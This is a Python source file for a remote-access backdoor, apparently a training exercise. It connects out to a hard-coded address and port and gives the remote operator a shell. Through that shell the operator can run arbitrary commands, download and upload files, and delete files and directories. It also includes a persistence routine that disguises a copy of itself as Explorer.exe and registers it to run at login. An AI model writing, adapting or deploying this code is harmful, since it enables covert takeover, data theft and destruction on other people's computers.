#!/usr/bin/env python

import socket, subprocess, json, os, base64, sys, shutil


class Backdoor:

    def __init__(self, ip, port):
        # self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_recv(self):
        json_dat = ""
        while True:
            try:
                json_dat = json_dat + self.connection.recv(1024)
                return json.loads(json_dat)

            except ValueError:
                continue

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def become_persistent(self):
        backdoor_location = os.environ["appdata"] + "\\Explorer.exe"
        if not os.path.exists(backdoor_location):
            shutil.copyfile(sys.executable, backdoor_location)
            subprocess.call(
                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + backdoor_location + '"',
                shell=True)

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload success."

    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stdin=DEVNULL, stderr=DEVNULL)

    def reliable_send(self, data):
        json_dat = json.dumps(data)
        self.connection.send(json_dat)

    def delete_this_file(self, path):
        os.remove(path)
        return "[+] File deletion complete."

    def change_directory(self, path):
        os.chdir(path)
        return "[+] Changing directory to" + path

    def delete_this_directory(self, path):
        os.removedirs(path)
        return "[+] Directory deletion complete."

    def rename_this_directory(self, src, dst):
        os.rename(src, dst)
        return "[+] Renaming successfull."

    def create_this_directory(self, path):
        os.mkdir(path)
        return ("[+] Successfully created " + path)

    def run(self):
        while True:
            command = self.reliable_recv()
            try:

                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()

                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_directory(command[1])

                elif command[0] == "download":
                    command_result = self.read_file(command[1])


                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])

                elif command[0] == "remove":
                    command_result = self.delete_this_file(command[1])

                elif command[0] == "deletedir":
                    command_result = self.delete_this_directory(command[1])

                elif command[0] == "makedir":
                    command_result = self.create_this_directory(command[1])

                else:
                    command_result = self.execute_system_command(command)

                self.reliable_send(command_result)

            except Exception:
                command_result = "[-] Control is just an illusion. Wrong command !"
                self.reliable_send(command_result)


ip = "172.17.31.109"
port = 4443
try:
    my_backdoor = Backdoor(ip, port)
    my_backdoor.run()
except Exception:
    sys.exit()